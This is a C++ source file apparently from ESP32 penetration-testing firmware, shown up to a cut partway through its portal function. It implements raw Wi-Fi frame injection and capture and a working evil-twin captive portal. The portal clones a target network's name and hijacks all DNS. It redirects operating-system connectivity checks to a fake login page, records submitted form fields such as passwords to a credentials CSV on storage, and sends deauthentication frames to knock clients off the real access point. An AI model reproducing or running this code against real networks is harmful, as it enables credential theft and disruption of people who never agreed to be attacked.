#include "wifi_raw_portal.h"

#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/radio_mem.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "modules/ble/ble_common.h"
#include "wifi_atks.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_heap_caps.h>
#include <esp_wifi.h>
#include <globals.h>
#include <string.h>

// Last channel the engine tuned to. Vandeta kept this in wifi_atks.cpp; nothing
// outside this module reads it, so it is file-local here.
static uint8_t wifi_channel = 0;

// ----------------------------------------------------------------------------
// Radio bring-up helpers used by every page in this port.
// ----------------------------------------------------------------------------

#define WIFI_SCAN_MIN_MS 100
#define WIFI_SCAN_MAX_MS 150

bool wifiEnsureRadioMem() {
    if (radioHasMemForWifi()) return true;
    Serial.printf(
        "[RAM] Low memory for WiFi (free internal %u, DMA block %u), releasing BLE...\n",
        (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL),
        (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_DMA)
    );
    // BLE is the usual reason the contiguous DMA block is gone, but the Web UI's
    // ports and any stale capture/promiscuous session also hold it. Free all
    // three before giving up, so a Wi-Fi page can still arm after a BLE feature
    // ran earlier in the boot.
    stopBLEStack();
    cleanlyStopWebUiForWiFiFeature();
    vTaskDelay(150 / portTICK_PERIOD_MS);
    if (radioHasMemForWifi()) return true;

    // Last resort: a promiscuous capture left running pins driver RX buffers.
    // Stopping it is safe here (the caller is about to bring Wi-Fi up anyway).
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    vTaskDelay(120 / portTICK_PERIOD_MS);
    return radioHasMemForWifi();
}

int wifiScanNets(bool showHidden) {
    static bool timingsSet = false;
    if (!timingsSet) {
        WiFi.setScanActiveMinTime(WIFI_SCAN_MIN_MS);
        timingsSet = true;
    }
    int16_t nets = WiFi.scanNetworks(false, showHidden, false, WIFI_SCAN_MAX_MS);
    return nets > 0 ? (int)nets : 0;
}

// ============================================================================
// Raw 802.11 injection / capture engine.
//
// Injection goes through wifiRawTx() (a thin retrying wrapper over
// esp_wifi_80211_tx) and capture goes through the promiscuous RX callback. Only
// one capture can run at a time: the ESP32 has a single radio, so a second
// capture would fight the first one for the channel. Captured bytes are parked
// in a PSRAM pool so a long capture cannot fragment the internal heap.
// ============================================================================

struct RawCaptureEntry {
    uint32_t timestamp; // millis() when the frame arrived
    uint8_t channel;    // channel reported by the radio's RX control block
    int8_t rssi;
    uint16_t len;
    uint16_t offset; // into the session pool
};

struct RawCaptureSession {
    bool used;
    bool running;
    uint8_t channel;
    uint32_t startMs;
    uint32_t deadlineMs; // 0 = no deadline
    uint32_t packetCount;
    uint32_t dropped;
    uint16_t poolUsed;
    uint8_t *pool; // WIFI_CAP_MAX_BYTES, PSRAM when available
    RawCaptureEntry entries[WIFI_CAP_MAX_PACKETS];
};

// 8 sessions x 307 B of bookkeeping that is only touched while a raw capture is
// armed: allocated from PSRAM on first use (internal heap as the fallback) rather
// than holding 2.5 KB of internal DRAM in .bss for every session. The RX callback
// below is the one place that must not allocate, so it only ever reads this
// pointer - the table is put in place by wifi_raw_capture_start() before any
// session can become active.
#define RAW_SESSIONS_BYTES (sizeof(RawCaptureSession) * WIFI_CAP_MAX_SESSIONS)
static RawCaptureSession *rawCaptureSessions = nullptr;
static volatile int rawActiveSession = -1;
static portMUX_TYPE rawCaptureMux = portMUX_INITIALIZER_UNLOCKED;
static volatile uint32_t rawPromiscPackets = 0;
static bool rawPromiscOn = false;
static bool rawStandalonePromisc = false;
static bool rawCapturePromisc = false; // promiscuous mode is held by a capture session
static bool rawWifiStartedByUs = false;

static void raw_capture_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void raw_promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);

static void raw_promisc_apply(bool enable) {
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;

    if (enable) {
        esp_wifi_set_promiscuous_filter(&filt);
        if (rawActiveSession >= 0) {
            esp_wifi_set_promiscuous_rx_cb(raw_capture_rx_cb);
        } else {
            esp_wifi_set_promiscuous_rx_cb(raw_promisc_rx_cb);
        }
        esp_wifi_set_promiscuous(true);
        rawPromiscOn = true;
    } else {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        rawPromiscOn = false;
    }
}

// Counts frames while promiscuous mode is on without an active capture session.
static void raw_promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)type;
    if (buf == NULL) return;
    rawPromiscPackets = rawPromiscPackets + 1;
}

// Promiscuous RX callback: copies the frame into the active session's PSRAM pool.
// Runs in the WiFi task, so keep the critical section tiny and allocation-free.
static bool rawSessionsEnsure() {
    if (rawCaptureSessions) return true;
    rawCaptureSessions =
        (RawCaptureSession *)(psramFound() ? ps_malloc(RAW_SESSIONS_BYTES) : malloc(RAW_SESSIONS_BYTES));
    if (rawCaptureSessions) memset(rawCaptureSessions, 0, RAW_SESSIONS_BYTES);
    return rawCaptureSessions != nullptr;
}

static void raw_capture_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)type;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt == NULL) return;

    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    if (len == 0) return;
    if (len > WIFI_RAW_MAX_FRAME) len = WIFI_RAW_MAX_FRAME;

    rawPromiscPackets = rawPromiscPackets + 1;

    int sid = rawActiveSession;
    if (sid < 0 || rawCaptureSessions == nullptr) return;

    RawCaptureSession &s = rawCaptureSessions[sid];
    uint32_t now = millis();

    portENTER_CRITICAL(&rawCaptureMux);
    if (!s.running || s.pool == NULL) {
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }
    if (s.deadlineMs != 0 && (int32_t)(now - s.deadlineMs) >= 0) {
        // Deadline reached: stop collecting. The JS side reaps the session, which
        // is where promiscuous mode gets switched off (not safe from this task).
        s.running = false;
        rawActiveSession = -1;
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }
    if (s.packetCount >= WIFI_CAP_MAX_PACKETS || (uint32_t)s.poolUsed + len > WIFI_CAP_MAX_BYTES) {
        s.dropped++;
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }

    RawCaptureEntry &e = s.entries[s.packetCount];
    e.timestamp = now;
    e.channel = (uint8_t)pkt->rx_ctrl.channel;
    e.rssi = (int8_t)pkt->rx_ctrl.rssi;
    e.len = len;
    e.offset = s.poolUsed;
    memcpy(s.pool + s.poolUsed, pkt->payload, len);
    s.poolUsed += len;
    s.packetCount++;
    portEXIT_CRITICAL(&rawCaptureMux);
}

static uint32_t raw_crc32(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int b = 0; b < 8; b++) {
            crc = (crc >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(crc & 1u)));
        }
    }
    return ~crc;
}

bool wifi_raw_prepare(int channel) {
    // WiFi already up: skip wifi_atk_setWifi() so injection loops do not re-print
    // its heap log on every frame. Non-NULL mode means "initialised" here, which
    // is the same assumption the on-screen attacks make.
    if (WiFi.getMode() == WIFI_MODE_NULL) {
        if (!wifi_atk_setWifi()) { return false; }
        rawWifiStartedByUs = true;
    }

    if (channel >= 1 && channel <= 14) {
        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
        wifi_channel = (uint8_t)channel;
    }
    return true;
}

WifiRawTxResult wifi_raw_inject(
    const uint8_t *frame, size_t rawLen, uint8_t channel, uint8_t repeat, int iface, bool appendFcs,
    uint32_t gapMs
) {
    WifiRawTxResult res = {};
    res.channel = channel;
    res.ok = false;

    if (frame == NULL || rawLen < 10) {
        res.error = "frame too short (min 10 bytes)";
        return res;
    }
    if (rawLen > WIFI_RAW_MAX_FRAME) {
        res.error = "frame too long (max 1500 bytes)";
        return res;
    }
    if (channel < 1 || channel > 14) {
        res.error = "channel must be 1-14";
        return res;
    }
    if (repeat < 1) repeat = 1;
    if (repeat > 64) repeat = 64;
    if (gapMs > 100) gapMs = 100;

    uint8_t buf[WIFI_RAW_MAX_FRAME + 4];
    size_t len = rawLen;
    memcpy(buf, frame, rawLen);
    if (appendFcs) {
        uint32_t fcs = raw_crc32(buf, rawLen);
        buf[len++] = (uint8_t)(fcs & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 8) & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 16) & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 24) & 0xFF);
    }
    res.len = (int)len;

    if (!wifi_raw_prepare(channel)) {
        res.error = "failed to start WiFi";
        return res;
    }
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    wifi_channel = channel;

    // Auto: try station first (the only supported interface on C-series parts),
    // then AP. Forced iface skips the fallback so failures stay visible.
    wifi_interface_t candidates[2];
    int candidateCount = 0;
    if (iface == 1) {
        candidates[candidateCount++] = WIFI_IF_AP;
    } else if (iface == 0) {
        candidates[candidateCount++] = WIFI_IF_STA;
    } else {
        candidates[candidateCount++] = WIFI_IF_STA;
        candidates[candidateCount++] = WIFI_IF_AP;
    }

    wifi_interface_t chosen = candidates[0];
    esp_err_t err = ESP_FAIL;
    bool haveIface = false;
    for (int i = 0; i < candidateCount; i++) {
        err = wifiRawTx(candidates[i], buf, len);
        if (err == ESP_OK || err == ESP_ERR_NO_MEM) {
            chosen = candidates[i];
            haveIface = true;
            break;
        }
        res.error = esp_err_to_name(err);
    }
    if (!haveIface) {
        res.failed = repeat;
        if (res.error == NULL) res.error = "esp_wifi_80211_tx rejected the frame";
        return res;
    }

    res.iface = (chosen == WIFI_IF_AP) ? "ap" : "sta";
    res.sent = 1; // the probe transmission above already went out
    for (uint8_t i = 1; i < repeat; i++) {
        esp_err_t e = wifiRawTx(chosen, buf, len);
        if (e == ESP_OK) {
            res.sent++;
        } else {
            res.failed++;
        }
        if (gapMs > 0) vTaskDelay(pdMS_TO_TICKS(gapMs));
    }

    res.ok = true;
    return res;
}

// Hand the WiFi driver back when the last raw capture closes.
//
// wifi_raw_prepare() opens the driver and only records that it did so
// (rawWifiStartedByUs); nothing on the stop path ever used that flag, so a
// scripted capture left the driver's buffers held until the next Wi-Fi feature
// or a reboot. Measured on the 2026-10-27 build: 25,171 bytes still allocated
// after wifi.captureStop(). The packet monitor's fix for the same leak is the
// reference: disconnect, then esp_wifi_deinit(), and leave the default event
// loop alone - here it belongs to the Arduino WiFi stack, not to the capture.
// Deliberately only when WE brought the driver up: a script that captured while
// the user was connected to an AP must not lose that connection.
static void raw_release_driver_if_idle() {
    if (rawActiveSession >= 0) return;                // another session still owns the radio
    if (rawPromiscOn || rawStandalonePromisc) return; // standalone promiscuous mode is still on
    if (!rawWifiStartedByUs) return;                  // the driver was already up: leave it up
    // The capture opened the driver, but something may have associated it since
    // (a script's wifi.connectTo, the WiFi menu, the MITM engine). Dropping the
    // driver would take that link down, so hand ownership over instead of
    // tearing down: the flag stays false, so no later capture stop can deinit a
    // driver that is now in use.
    if (WiFi.isConnected()) {
        rawWifiStartedByUs = false;
        return;
    }
    rawWifiStartedByUs = false;
    wifiDisconnect(); // Arduino's mode must go to NULL before a raw deinit
    esp_err_t e = esp_wifi_deinit();
    if (e != ESP_OK && e != ESP_ERR_WIFI_NOT_INIT)
        Serial.printf("[WIFI_RAW] wifi_deinit: %s\n", esp_err_to_name(e));
}

bool wifi_raw_capture_poll() {
    bool reaped = false;

    int sid = rawActiveSession;
    if (sid >= 0) {
        RawCaptureSession &s = rawCaptureSessions[sid];
        if (s.deadlineMs != 0 && (int32_t)(millis() - s.deadlineMs) >= 0) {
            s.running = false;
            rawActiveSession = -1;
            reaped = true;
        }
    }

    // A capture that ended on its own deadline (or from the RX callback) still
    // holds promiscuous mode until it is reaped here, which is where it is safe
    // to touch the WiFi driver again.
    if (rawActiveSession < 0 && rawCapturePromisc) {
        rawCapturePromisc = false;
        raw_promisc_apply(rawStandalonePromisc);
        reaped = true;
    }
    // A timed-out capture must release the driver too: reaping it is the only
    // moment the radio is provably idle, so the same teardown the stop path uses
    // belongs here as well (otherwise wifi.captureStart(ch, 2000) followed by a
    // script that just reads the packets leaks the driver for the whole boot).
    if (reaped) raw_release_driver_if_idle();
    return reaped;
}

int wifi_raw_capture_start(uint8_t channel, uint32_t timeoutMs) {
    if (channel < 1 || channel > 14) return -1;
    if (!rawSessionsEnsure()) {
        Serial.println("[WIFI_RAW] session table allocation failed");
        return -1;
    }

    wifi_raw_capture_poll();
    if (rawActiveSession >= 0) return -1; // one capture at a time (single radio)

    // The driver's RX/TX buffers come from DMA-capable internal DRAM, so a stale
    // BLE stack or Web UI makes esp_wifi_init() fail with ESP_ERR_NO_MEM. Same
    // guard every on-screen Wi-Fi tool uses before bringing the radio up.
    if (WiFi.getMode() == WIFI_MODE_NULL && !wifiEnsureRadioMem()) {
        Serial.println("[WIFI_RAW] not enough internal RAM for the WiFi driver");
        return -1;
    }

    if (timeoutMs == 0) timeoutMs = 60000;
    if (timeoutMs < 200) timeoutMs = 200;
    if (timeoutMs > 60000) timeoutMs = 60000;

    int slot = -1;
    for (int i = 0; i < WIFI_CAP_MAX_SESSIONS; i++) {
        if (!rawCaptureSessions[i].used) {
            slot = i;
            break;
        }
    }
    if (slot < 0) { // reuse the oldest stopped session
        uint32_t oldest = 0xFFFFFFFF;
        for (int i = 0; i < WIFI_CAP_MAX_SESSIONS; i++) {
            if (!rawCaptureSessions[i].running && rawCaptureSessions[i].startMs <= oldest) {
                oldest = rawCaptureSessions[i].startMs;
                slot = i;
            }
        }
    }
    if (slot < 0) return -1;

    RawCaptureSession &s = rawCaptureSessions[slot];
    if (s.pool == NULL) {
        s.pool = (uint8_t *)(psramFound() ? ps_malloc(WIFI_CAP_MAX_BYTES) : malloc(WIFI_CAP_MAX_BYTES));
        if (s.pool == NULL) {
            Serial.println("[WIFI_RAW] capture pool allocation failed");
            return -1;
        }
    }

    s.used = true;
    s.running = false;
    s.channel = channel;
    s.startMs = millis();
    s.deadlineMs = s.startMs + timeoutMs;
    s.packetCount = 0;
    s.dropped = 0;
    s.poolUsed = 0;

    if (!wifi_raw_prepare(channel)) {
        Serial.println("[WIFI_RAW] failed to start WiFi for capture");
        return -1;
    }

    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(raw_capture_rx_cb);
    esp_err_t e = esp_wifi_set_promiscuous(true);
    if (e != ESP_OK) {
        Serial.printf("[WIFI_RAW] esp_wifi_set_promiscuous: %s\n", esp_err_to_name(e));
        return -1;
    }

    rawPromiscOn = true;
    rawCapturePromisc = true;
    s.running = true;
    rawActiveSession = slot;
    return slot + 1;
}

bool wifi_raw_capture_stop(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return false;
    if (rawCaptureSessions == nullptr || !rawCaptureSessions[slot].used) return false;

    wifi_raw_capture_poll(); // reap it first if its deadline already passed
    bool ownsRadio = (rawActiveSession == slot) || (rawActiveSession < 0 && rawCapturePromisc);
    rawCaptureSessions[slot].running = false;

    if (ownsRadio) {
        rawActiveSession = -1;
        rawCapturePromisc = false;
        // Captured data stays in the pool for wifi_raw_capture_packet().
        raw_promisc_apply(rawStandalonePromisc);
        raw_release_driver_if_idle();
    }
    return true;
}

bool wifi_raw_capture_running(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS || rawCaptureSessions == nullptr) return false;
    return rawCaptureSessions[slot].used && rawCaptureSessions[slot].running;
}

int wifi_raw_capture_packet_count(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return -1;
    if (rawCaptureSessions == nullptr || !rawCaptureSessions[slot].used) return -1;
    return (int)rawCaptureSessions[slot].packetCount;
}

int wifi_raw_capture_dropped(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return -1;
    if (rawCaptureSessions == nullptr || !rawCaptureSessions[slot].used) return -1;
    return (int)rawCaptureSessions[slot].dropped;
}

int wifi_raw_capture_channel(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return 0;
    if (rawCaptureSessions == nullptr || !rawCaptureSessions[slot].used) return 0;
    return rawCaptureSessions[slot].channel;
}

bool wifi_raw_capture_packet(
    int sessionId, int index, uint32_t *timestamp, uint8_t *channel, int8_t *rssi, const uint8_t **data,
    uint16_t *len
) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS || rawCaptureSessions == nullptr) return false;

    RawCaptureSession &s = rawCaptureSessions[slot];
    portENTER_CRITICAL(&rawCaptureMux);
    if (!s.used || index < 0 || (uint32_t)index >= s.packetCount || s.pool == NULL) {
        portEXIT_CRITICAL(&rawCaptureMux);
        return false;
    }
    const RawCaptureEntry &e = s.entries[index];
    if (timestamp != NULL) *timestamp = e.timestamp;
    if (channel != NULL) *channel = e.channel;
    if (rssi != NULL) *rssi = e.rssi;
    if (data != NULL) *data = s.pool + e.offset;
    if (len != NULL) *len = e.len;
    portEXIT_CRITICAL(&rawCaptureMux);
    return true;
}

bool wifi_raw_set_promiscuous(bool enable, uint8_t channel) {
    if (enable) {
        if (channel >= 1 && channel <= 14) {
            if (!wifi_raw_prepare(channel)) return false;
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            wifi_channel = channel;
        } else if (WiFi.getMode() == WIFI_MODE_NULL) {
            if (!wifi_raw_prepare(-1)) return false;
        }
        rawStandalonePromisc = true;
        raw_promisc_apply(true);
        return true;
    }

    rawStandalonePromisc = false;
    int sid = rawActiveSession;
    if (sid >= 0 && rawCaptureSessions != nullptr) { rawCaptureSessions[sid].running = false; }
    rawActiveSession = -1;
    rawCapturePromisc = false;
    raw_promisc_apply(false);
    return true;
}

void wifi_raw_cleanup() {
    rawActiveSession = -1;
    for (int i = 0; rawCaptureSessions != nullptr && i < WIFI_CAP_MAX_SESSIONS; i++) {
        rawCaptureSessions[i].running = false;
        if (rawCaptureSessions[i].pool != NULL) {
            free(rawCaptureSessions[i].pool);
            rawCaptureSessions[i].pool = NULL;
        }
        rawCaptureSessions[i].used = false;
        rawCaptureSessions[i].packetCount = 0;
        rawCaptureSessions[i].poolUsed = 0;
    }

    if (rawPromiscOn) { raw_promisc_apply(false); }
    rawStandalonePromisc = false;
    rawCapturePromisc = false;

    if (rawWifiStartedByUs) {
        rawWifiStartedByUs = false;
        wifi_atk_unsetWifi();
    }
}

// ============================================================================
// Evil-twin captive portal engine (backs wifi.portal()).
//
// Same shape as EvilPortal: an open twin AP on the target channel, a wildcard
// DNS server so every name resolves to us, and an AsyncWebServer that answers
// the OS captive-portal probes with a redirect and everything else with the
// caller's page. The page (or redirect target) comes from the script, so one
// engine covers rickrolls, fake logins and splash pages alike.
// ============================================================================

static AsyncWebServer *portalServer = nullptr;
static DNSServer *portalDns = nullptr;
static volatile uint32_t portalRequests = 0;
static portMUX_TYPE portalMux = portMUX_INITIALIZER_UNLOCKED;
static String portalPage;     // served for every non-probe request
static String portalRedirect; // when set, every request goes here instead
static volatile uint32_t portalFieldSets = 0;
static String portalLastFields;

// A fake-login twin gets its password from a form POST. Counting requests does
// not prove the attack worked, so the fields are logged, kept for the run screen
// and appended to a CSV that outlives the run.
static void portal_note_fields(AsyncWebServerRequest *request) {
    if (request->args() == 0) return;
    String line;
    for (size_t i = 0; i < request->args() && i < 8; i++) {
        if (i) line += "&";
        line += request->argName(i) + "=" + request->arg(i);
    }
    if (line.length() > 140) line = line.substring(0, 140);
    portalLastFields = line;
    portalFieldSets = portalFieldSets + 1;
    Serial.printf(
        "[PORTAL] form %s %s -> %s\n", request->methodToString(), request->url().c_str(), line.c_str()
    );
    FS *fs = nullptr;
    if (getFsStorage(fs) && fs != nullptr) {
        if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");
        File f = fs->open("/BruceEvilCreds/ucmitm_creds.csv", FILE_APPEND);
        if (f) {
            f.println(line);
            f.close();
        }
    }
}

static void portal_count_request() {
    // Plain assignment (not ++) so the volatile flag does not trip -Wvolatile.
    portENTER_CRITICAL(&portalMux);
    uint32_t next = portalRequests + 1;
    portalRequests = next;
    portEXIT_CRITICAL(&portalMux);
}

// The caller's page, or a 302 to the caller's URL when one was given.
static void portal_send_page(AsyncWebServerRequest *request) {
    portal_count_request();
    portal_note_fields(request);
    // The host is the domain the client asked for, which is what a recon run
    // needs to report: a twin sees every name its clients visit.
    Serial.printf("[PORTAL] %s %s%s\n", request->methodToString(), request->host().c_str(), request->url().c_str());
    if (portalRedirect.length() > 0) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", portalRedirect);
        response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate");
        request->send(response);
        return;
    }
    request->send(200, "text/html", portalPage);
}

// The paths the OSes probe to decide "is this network captive?". Answering them
// with a redirect is what makes Windows/macOS/Android/Linux open their
// "sign in to network" browser, which is where the payload page lands.
static const char *portalProbePaths[] = {
    "/generate_204",
    "/gen_204",
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect",
    "/success.txt",
    "/canonical.html",
    "/fwlink",
    "/wpad.dat",
    "/mobile/status.php",
};

static void portal_send_probe(AsyncWebServerRequest *request) {
    portal_count_request();
    AsyncWebServerResponse *response = request->beginResponse(302);
    response->addHeader(
        "Location", portalRedirect.length() > 0 ? portalRedirect : "http://" + WiFi.softAPIP().toString() + "/"
    );
    response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate");
    request->send(response);
}

// Unknown paths: clients request their probe with the vendor host in the path
// (/nmcheck.gnome.org, /clients3.google.com/generate_204, ...), so match on
// substrings rather than exact paths.
static void portal_send_catchall(AsyncWebServerRequest *request) {
    String url = request->url();
    static const char *probeHints[] = {
        "detectportal", "connecttest", "msftconnecttest", "clients3.google.com", "generate_204", "gen_204",
        "ncsi",         "nmcheck",     "gnome",           "ubuntu",               "canonical",    "networkcheck",
        "hotspot",      "success.txt", "captive",         "apple.com",
    };
    for (size_t i = 0; i < sizeof(probeHints) / sizeof(probeHints[0]); i++) {
        if (url.indexOf(probeHints[i]) != -1) {
            portal_send_probe(request);
            return;
        }
    }
    portal_send_page(request);
}

// One tick of deauth at the real AP, so its clients (re)associate with the twin.
static uint32_t portal_deauth_burst(const uint8_t bssid[6], uint8_t channel, const uint8_t *target) {
    uint32_t sent = 0;
    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = channel;
    wsl_bypasser_send_raw_frame(&ap_record, channel, target != nullptr ? target : _default_target);
    sent++;
    for (int i = 0; i < 3; i++) {
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        sent += 3; // send_raw_frame() transmits each frame three times
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    return sent;
}

// The ucmitm run screen: a twin has no counters a person can read anywhere
// else, so say who is on it and what it is serving. The connected run paints
// its own feed (mitm_menu.cpp); this one is only used by ucmitm.
static int16_t portalTextY = -1; // first line under the title, kept across redraws

static void portal_draw_screen(
    const WifiPortalConfig &cfg, uint8_t channel, uint32_t upMs, uint32_t deauthFrames
) {
    drawMainBorderWithTitle("UC-MITM TWIN");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    // The border and title leave the cursor on the first free line. The twin
    // redraws this screen every 500 ms, so remember that line and return to it:
    // without this each refresh appended below the previous one and the panel
    // walked off the bottom of the screen after a minute of running.
    if (portalTextY < 0) portalTextY = tft.getCursorY();
    tft.setCursor(0, portalTextY);
    String ssid = cfg.ssid;
    if (ssid.length() > 18) ssid = ssid.substring(0, 18) + "..";
    padprintln("twin: " + ssid + " ch" + String(channel));
    padprintln("ap: " + WiFi.softAPIP().toString());
    padprintln("clients: " + String(WiFi.softAPgetStationNum()) + "  req: " + String(portalRequests));
    if (cfg.deauth) padprintln("deauth: " + String(deauthFrames) + " frames");
    else padprintln("deauth: off");
    if (portalLastFields.length()) padprintln("form: " + portalLastFields);
    padprintln("up: " + String(upMs / 1000) + "s   BACK stops");
}

// Bounds a portal serve. Vandeta reached this through its patching slot
// portal_serve; without that overlay it is a plain function.
__attribute__((noinline, used)) uint32_t portal_serve_body(uint32_t durationMs) {
    uint32_t d = durationMs;
    if (d < WIFI_PORTAL_MIN_MS) d = WIFI_PORTAL_MIN_MS;
    if (d > WIFI_PORTAL_MAX_MS) d = WIFI_PORTAL_MAX_MS;
    return d;
}

WifiPortalStats wifi_portal_run(const WifiPortalConfig &cfg) {
    WifiPortalStats stats;

    String ssid = cfg.ssid;
    ssid.trim();
    if (ssid.length() == 0 || ssid.length() > 32) {
        stats.error = "ssid must be 1-32 characters";
        return stats;
    }
    if (cfg.channel < 1 || cfg.channel > 14) {
        stats.error = "channel must be 1-14";
        return stats;
    }

    uint32_t duration = portal_serve_body(cfg.durationMs);

    String page = cfg.html;
    if (page.length() == 0 && cfg.htmlFile.length() > 0) {
        bool sdDetected = setupSdCard();
        FS *fs = sdDetected ? (FS *)&SD : (FS *)&LittleFS;
        if (fs->exists(cfg.htmlFile)) {
            File f = fs->open(cfg.htmlFile, FILE_READ);
            if (f) {
                page = f.readString();
                f.close();
            }
        }
        if (page.length() == 0) {
            stats.error = "htmlFile could not be read";
            return stats;
        }
    }
    if (page.length() == 0 && cfg.redirect.length() == 0) {
        stats.error = "nothing to serve: pass html, htmlFile or redirect";
        return stats;
    }

    // Own the radio: stop the firmware web UI, any capture / promiscuous mode and
    // any AP left over from an earlier binding.
    cleanlyStopWebUiForWiFiFeature();
    wifi_raw_cleanup();
    wifi_complete_cleanup();

    // The twin needs AP mode plus an HTTP server and a DNS server, and BLE on
    // this board holds the DMA block that makes those fail. Release it, then
    // refuse cleanly if the radio still cannot come up - this is what turns the
    // "evil twin" crash into an error message a script can report.
    stopBLEStack();
    vTaskDelay(120 / portTICK_PERIOD_MS);
    if (radioLargestDmaBlock() < RADIO_WIFI_MIN_DMA_BLOCK) {
        stats.error = "not enough DMA memory for the portal AP";
        wifi_complete_cleanup(false);
        return stats;
    }

    IPAddress gateway;
    if (!gateway.fromString(cfg.gateway.length() > 0 ? cfg.gateway : bruceConfig.evilPortalGatewayIp)) {
        gateway = IPAddress(172, 0, 0, 1);
    }

    portalPage = page;
    portalRedirect = cfg.redirect;
    portalRequests = 0;
    portalFieldSets = 0;
    portalLastFields = "";

    if (!WiFi.mode(WIFI_MODE_AP)) {
        stats.error = "failed to start WiFi in AP mode";
        wifi_complete_cleanup(false);
        return stats;
    }
    WiFi.softAPConfig(gateway, gateway, IPAddress(255, 255, 255, 0));

    // A twin belongs on the picked network's channel, but the board's driver can
    // refuse 12-14: with the default world domain (cc=01) 2G stops at 11, so
    // softAP() fails with ESP_ERR_INVALID_ARG and the whole run died with
    // "softAP failed for this ssid/channel/password" - a picked AP on ch13 got
    // no twin at all. Fold onto the highest channel the domain allows instead of
    // losing the attack; the log and the run screen say which channel came up.
    uint8_t apChannel = cfg.channel;
    wifi_country_t legal = {};
    if (esp_wifi_get_country(&legal) == ESP_OK && legal.nchan > 0) {
        int last = (int)legal.schan + (int)legal.nchan - 1;
        if (last >= 1 && (int)apChannel > last) apChannel = (uint8_t)last;
    }

    String pass = cfg.password.length() > 0 ? cfg.password : emptyString;
    if (!WiFi.softAP(ssid.c_str(), pass.c_str(), apChannel, 0, cfg.maxClients)) {
        // Last resort: one channel over still beats a run that never starts.
        if (apChannel == 1) {
            stats.error = "softAP failed for this ssid/channel/password";
            WiFi.mode(WIFI_OFF);
            return stats;
        }
        Serial.printf("[PORTAL] ch%u refused, retrying on ch1\n", (unsigned)apChannel);
        apChannel = 1;
        if (!WiFi.softAP(ssid.c_str(), pass.c_str(), apChannel, 0, cfg.maxClients)) {
            stats.error = "softAP failed for this ssid/channel/password";
            WiFi.mode(WIFI_OFF);
            return stats;
        }
    }
    stats.channel = apChannel;
    if (apChannel != cfg.channel) {
        Serial.printf(
            "[PORTAL] ch%u not allowed on this board - twin came up on ch%u\n", (unsigned)cfg.channel,
            (unsigned)apChannel
        );
    }
    wifiConnected = true;
    stats.ip = WiFi.softAPIP().toString();

    // Give the AP + its DHCP server a moment before clients can associate.
    uint32_t settle = millis();
    while (millis() - settle < 1200) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    portalServer = new (std::nothrow) AsyncWebServer(80);
    if (portalServer == nullptr) {
        stats.error = "out of memory for the captive portal server";
        WiFi.softAPdisconnect(true);
        wifi_complete_cleanup(false);
        return stats;
    }
    for (size_t i = 0; i < sizeof(portalProbePaths) / sizeof(portalProbePaths[0]); i++) {
        portalServer->on(portalProbePaths[i], HTTP_GET, portal_send_probe);
    }
    portalServer->on("/", HTTP_GET, portal_send_page);
    portalServer->onNotFound(portal_send_catchall);
    portalServer->begin();

    if (cfg.hijackDns) {
        portalDns = new (std::nothrow) DNSServer();
        if (portalDns != nullptr) portalDns->start(53, "*", WiFi.softAPIP());
    }

    // Deauth is transmitted on the twin's channel, so it can only push clients
    // off the real AP when the two share one (they do unless the channel had to
    // be folded onto a legal one above).
    bool deauthOn = cfg.deauth && cfg.hasTargetBssid && apChannel == cfg.channel;
    if (cfg.deauth && cfg.hasTargetBssid && !deauthOn) {
